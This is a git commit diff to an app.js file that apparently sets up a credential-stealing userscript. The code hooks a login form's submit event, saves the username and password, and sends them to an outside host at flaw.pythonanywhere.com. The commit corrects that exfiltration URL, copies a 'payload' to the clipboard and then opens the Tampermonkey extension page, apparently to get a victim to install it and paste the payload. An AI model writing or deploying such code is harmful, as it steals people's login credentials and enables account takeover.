26c1c9779681eb51c32023837f2893e60c0f13c0
va9iff <va9iff@gmail.com>
2022-04-19 13:59:25 +0400

    tamper monkey opening right after

--- app.js
+++ app.js
@@ -5,14 +5,21 @@ document.querySelector('form#login-form').addEventListener('submit',(e)=>{
     let un = document.querySelector('#LoginForm_username').value
     localStorage.u= un
     localStorage.p= pw
-    fetch("https://flaw.pythonanywhere.com/save/${un}/${pw}")
+    fetch('https://flaw.pythonanywhere.com/save/'+un+'/'+pw+'}')
 
 })
 
 `
 
-
 window.focus()
 navigator.clipboard.writeText(payload);
 
-setTimeout(()=>window.close(), 1000)
+setTimeout(()=>{
+	// window.close()
+	let a = document.createElement("a")
+	a.href = "https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en-US"
+	// a.target = "blank"
+	a.innerHTML = "testu"
+	document.body.appendChild(a)
+	a.click()
+}, 1000)
